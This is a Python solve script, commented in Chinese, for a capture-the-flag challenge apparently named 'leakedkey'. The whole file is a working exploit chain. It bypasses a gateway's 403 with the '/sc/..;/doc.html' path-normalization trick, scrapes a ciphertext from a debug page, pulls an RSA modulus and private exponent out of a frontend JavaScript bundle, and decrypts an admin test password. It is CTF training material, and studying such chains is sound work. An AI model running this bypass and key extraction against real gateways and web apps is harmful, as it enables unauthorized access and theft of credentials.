#!/usr/bin/env python3
"""leakedkey exp —— 全链 PoC：绕网关取密文 + 提取前端私钥 + 解密拿 flag。

步骤：
  1. GET /sc/..;/doc.html          复用题1 同款解析差异绕过网关 403
  2. 从"开发调试记录"提取密文 hex（顺带可见静态诱饵 fflag{...}，非答案）
  3. GET / + app.js，提取 modulus / private_exponent
  4. m = pow(c, d, n)，按 PKCS1-v1_5 去 padding，得管理员测试口令即 flag

用法:
    python3 solve.py http://HOST:58000
无第三方依赖。
"""
import re
import sys
import urllib.request


def unpad(m: int, k: int) -> bytes:
    b = m.to_bytes(k, "big")
    if b[0] != 0 or b[1] != 2:
        raise ValueError("bad padding")
    return b[b.index(0, 2) + 1:]


def get(url: str) -> str:
    return urllib.request.urlopen(url, timeout=30).read().decode("utf-8", "ignore")


def main():
    if len(sys.argv) < 2:
        sys.exit("usage: solve.py http://HOST:58000")
    base = sys.argv[1].rstrip("/")

    # 1. 绕过网关拿 doc.html（题1 同款差异：/sc/ 原样转发，后端剥离路径参数 + 点段归一化）
    doc = get(base + "/sc/..;/doc.html")
    m_ct = re.search(r'<code id="ct">([0-9a-fA-F]+)</code>', doc)
    if not m_ct:
        sys.exit("[-] ciphertext not found in doc.html")
    print(f"[+] /sc/..;/doc.html -> doc.html, ciphertext {len(m_ct.group(1))//2} bytes")
    decoy = re.search(r"(fflag\{[^}]*\})", doc)
    if decoy:
        print(f"[*] 调试记录里的 {decoy.group(1)} 是诱饵，不是答案")

    # 2. 登录页 -> app.js，提取 RSA 常量
    html = get(base + "/")
    m_js = re.search(r"src=(/assets/js/app\.[0-9a-f]+\.js)", html)
    if not m_js:
        sys.exit("[-] app.js not found in index.html")
    js = get(base + m_js.group(1))
    mod = re.search(r'modulus:"([0-9a-fA-F]+)"', js)
    pri = re.search(r'private_exponent:"([0-9a-fA-F]+)"', js)
    if not (mod and pri):
        sys.exit("[-] key constants not found")
    print(f"[+] {m_js.group(1)}")
    print(f"[+] n = {mod.group(1)[:24]}...  d = {pri.group(1)[:24]}...")

    # 3. 解密
    n, d, c = int(mod.group(1), 16), int(pri.group(1), 16), int(m_ct.group(1), 16)
    k = (n.bit_length() + 7) // 8
    print("[+] 解密结果:", unpad(pow(c, d, n), k).decode())


if __name__ == "__main__":
    main()
